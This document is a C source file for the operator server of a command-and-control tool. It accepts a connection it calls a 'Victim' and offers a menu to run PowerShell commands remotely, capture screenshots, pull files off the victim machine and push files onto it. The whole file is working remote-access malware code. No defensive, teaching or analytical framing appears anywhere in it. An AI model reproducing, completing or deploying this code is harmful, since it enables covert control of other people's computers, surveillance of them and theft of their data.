#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <limits.h>
#include "c2.h"
#include "common.h"
#include "server/utils.h"

#define DEFAULT_DOWNLOAD_NAME "downloaded_file.bin"
#define DEFAULT_UPLOAD_NAME   "uploaded_file.bin"

static void trim_newline(char *str) {
    if (!str) return;
    size_t len = strlen(str);
    while (len > 0 && (str[len - 1] == '\n' || str[len - 1] == '\r')) {
        str[--len] = '\0';
    }
}

static int prompt_line(const char *prompt, char *out, size_t out_len) {
    printf("%s", prompt);
    if (!fgets(out, out_len, stdin)) {
        return 0;
    }
    trim_newline(out);
    return 1;
}

int main() {
    // Client and server socket file descriptors
    sock_t server_fd, client_fd;

    // Socket address structure
    struct sockaddr_in addr = {0};
    socklen_t addr_len = sizeof(addr);

    SOCK_INIT();

    // Create a TCP socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); exit(1); }

    // Config
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    addr.sin_family = AF_INET;         
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(C2_PORT);

    // Bind the socket to the address
    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind"); exit(1);
    }
    // Begin listening and accept one connection
    if (listen(server_fd, 1) < 0) { perror("listen"); exit(1); } 

    printf("[*] C2 listening on 0.0.0.0:%d\n", C2_PORT);

    // Waiting for client connection
    client_fd = accept(server_fd, (struct sockaddr*)&addr, &addr_len);
    if (client_fd < 0) { perror("accept"); exit(1); }
    printf("[+] Victim connected from %s\n", inet_ntoa(addr.sin_addr));

    // Print client info upon first time connecting
    char* client_info = safe_recv_payload(client_fd, NULL, 0);
    printf("%s", client_info);
    free(client_info);

    // Main loop
    while(1) {
        char cmd[5];
        printf("[*] Command list, type quit to exit:\n");
        printf("1. Execute powershell command.\n");
        printf("2. Take screenshot.\n");
        printf("3. Download file from client.\n");
        printf("4. Upload file to client.\n");
        if (!fgets(cmd, sizeof(cmd), stdin)) break;
        cmd[strcspn(cmd, "\n")] = '\0'; // remove newline if present

        if (strcmp(cmd, "quit") == 0) break;

        if (strcmp(cmd, "1") == 0) {
            // Start powershell session
            if (safe_send(client_fd, "1", 1, 0) <= 0) {
                break;
            }
            psh_send(client_fd);
        } else if (strcmp(cmd, "2") == 0) {
            if (safe_send(client_fd, "2", 1, 0) <= 0) {
                break;
            }

            int file_size;
            BYTE* file_buffer = (BYTE*)safe_recv_payload(client_fd, &file_size, 0);
            if (file_buffer == NULL) break;

            char filename[64];
            time_t now = time(NULL);
            snprintf(filename, sizeof(filename), "screenshot_%ld.bmp", (long)now);

            FILE *fp = fopen(filename, "wb");
            if (!fp) {
                perror("fopen");
                free(file_buffer);
                continue;
            }

            fwrite(file_buffer, 1, file_size, fp);
            fclose(fp);
            free(file_buffer);

            printf("[+] Screenshot saved to %s (%u bytes)\n", filename, file_size);
            continue;
        } else if (strcmp(cmd, "3") == 0) {
            if (safe_send(client_fd, "3", 1, 0) <= 0) break;

            char remote_path[512] = {0};
            char local_path[512] = {0};

            if (!prompt_line("Remote file path to download: ", remote_path, sizeof(remote_path))) break;
            if (remote_path[0] == '\0') {
                printf("[ERR] Remote path cannot be empty.\n");
                continue;
            }

            if (!prompt_line("Local save path: ", local_path, sizeof(local_path))) break;

            if (safe_send_payload(client_fd, remote_path, strlen(remote_path) + 1, 0) < 0) break;

            char status;
            if (safe_recv(client_fd, &status, 1, 0) <= 0) break;


            if (status == '1') {
                int file_size = 0;
                BYTE *file_buffer = (BYTE*)safe_recv_payload(client_fd, &file_size, 0);
                if (!file_buffer) {
                    printf("[ERR] Failed to receive file contents.\n");
                    continue;
                }

                FILE *fp = fopen(local_path, "wb");
                if (!fp) {
                    perror("fopen");
                    free(file_buffer);
                    continue;
                }

                size_t expected = (size_t)file_size;
                size_t written = expected ? fwrite(file_buffer, 1, expected, fp) : 0;
                fclose(fp);
                free(file_buffer);

                if (written != expected) {
                    printf("[ERR] Short write when saving %s\n", local_path);
                } else {
                    printf("[+] Saved file to %s (%d bytes)\n", local_path, file_size);
                }
            } else {
                char *err_msg = (char*)safe_recv_payload(client_fd, NULL, 0);
                if (err_msg) {
                    printf("[ERR] Client error: %s\n", err_msg);
                    free(err_msg);
                } else {
                    printf("[ERR] Client reported failure.\n");
                }
            }
            continue;
        } else if (strcmp(cmd, "4") == 0) {
            if (safe_send(client_fd, "4", 1, 0) <= 0) {
                break;
            }

            char local_path[512] = {0};
            char remote_path[512] = {0};

            if (!prompt_line("Local file path to upload: ", local_path, sizeof(local_path))) break;
            if (local_path[0] == '\0') {
                printf("[ERR] Local path cannot be empty.\n");
                continue;
            }

            if (!prompt_line("Destination path on client: ", remote_path, sizeof(remote_path))) break;

            size_t file_size = 0;
            char *file_buffer = read_file(local_path, &file_size);
            if (!file_buffer) {
                continue;
            }

            if (file_size > INT_MAX) {
                printf("[ERR] File too large to transfer (>%d bytes)\n", INT_MAX);
                free(file_buffer);
                continue;
            }

            if (safe_send_payload(client_fd, remote_path, strlen(remote_path) + 1, 0) < 0) {
                free(file_buffer);
                break;
            }
            if (safe_send_payload(client_fd, file_buffer, (int)file_size, 0) < 0) {
                free(file_buffer);
                break;
            }
            free(file_buffer);

            char status;
            if (safe_recv(client_fd, &status, 1, 0) <= 0) {
                break;
            }

            if (status == '1') {
                printf("[+] Uploaded %zu bytes to %s\n", file_size, remote_path);
            } else {
                char *err_msg = (char*)safe_recv_payload(client_fd, NULL, 0);
                if (err_msg) {
                    printf("[ERR] Client error: %s\n", err_msg);
                    free(err_msg);
                } else {
                    printf("[ERR] Client reported failure while uploading.\n");
                }
            }
            continue;
        } else {
            printf("[ERR] Invalid command.\n");
        }

    }

    CLOSE_SOCK(client_fd);  
    CLOSE_SOCK(server_fd);
    SHUT_DOWN();
    return 0; 
}